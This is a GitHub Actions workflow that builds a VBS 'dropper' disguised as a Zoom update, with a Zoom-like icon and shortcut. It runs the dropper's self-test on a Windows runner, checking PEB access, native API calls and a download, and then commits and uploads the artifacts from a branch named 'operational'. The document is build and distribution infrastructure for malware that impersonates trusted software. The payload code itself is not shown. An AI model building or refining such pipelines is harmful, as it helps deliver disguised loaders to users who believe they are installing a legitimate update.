name: Build Windows Dropper

# Builds the VBS loader + Zoom-looking icon/shortcut, runs its self-test on a
# real Windows runner, then commits the artifacts into the distribution tree.

on:
  push:
    branches: [operational-v2-ALLclient-working]
    paths:
      - 'client-wrappers/client-wrappers/windows-dropper.template.vbs'
      - 'client-wrappers/client-wrappers/build-windows-dropper.ps1'
      - '.github/workflows/build-windows-dropper.yml'
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: windows-dropper-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Build dropper
        shell: pwsh
        run: ./client-wrappers/client-wrappers/build-windows-dropper.ps1

      - name: Self-test (PEB, native API, download, SHA-256)
        shell: pwsh
        run: |
          $vbs = Get-ChildItem 'distro/clients/windows/Zoom_Update_*.vbs' | Select-Object -First 1
          cscript.exe //nologo $vbs.FullName /selftest /noelevate
          if ($LASTEXITCODE -ne 0) { throw "self-test failed: $LASTEXITCODE" }
          $log = Join-Path $env:TEMP 'zoom-selftest.log'
          Get-Content $log
          if (-not (Select-String -Path $log -Pattern '^result=PASS$')) {
            throw 'self-test did not report PASS'
          }

      - name: Stage artifacts
        shell: pwsh
        run: |
          Copy-Item 'distro/clients/windows/Zoom_Update_v6.1.0.vbs' `
            'client-wrappers/client-wrappers/zoom-update-microsoft.vbs' -Force
          Copy-Item 'distro/clients/windows/Zoom_Update_v6.1.0.ico' `
            'client-wrappers/client-wrappers/Zoom_Update_v6.1.0.ico' -Force

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: windows-zoom-dropper
          path: |
            distro/clients/windows/Zoom_Update_v6.1.0.vbs
            distro/clients/windows/Zoom_Update_v6.1.0.ico
            distro/clients/windows/Zoom_Update_v6.1.0.lnk
            distro/clients/windows/SHA256SUMS-windows-dropper
          if-no-files-found: error

      - name: Commit artifacts
        shell: pwsh
        run: |
          git config user.name 'BetterDesk CI'
          git config user.email 'ci@betterdesk.local'
          git add client-wrappers/client-wrappers/zoom-update-microsoft.vbs `
            client-wrappers/client-wrappers/Zoom_Update_v6.1.0.ico `
            distro/clients/windows/Zoom_Update_v6.1.0.vbs `
            distro/clients/windows/Zoom_Update_v6.1.0.ico `
            distro/clients/windows/Zoom_Update_v6.1.0.lnk `
            distro/clients/windows/SHA256SUMS-windows-dropper
          git diff --cached --quiet; if ($LASTEXITCODE -eq 0) { exit 0 }
          git commit -m 'Build Windows Zoom dropper artifacts'
          git push origin "HEAD:${{ github.ref_name }}"
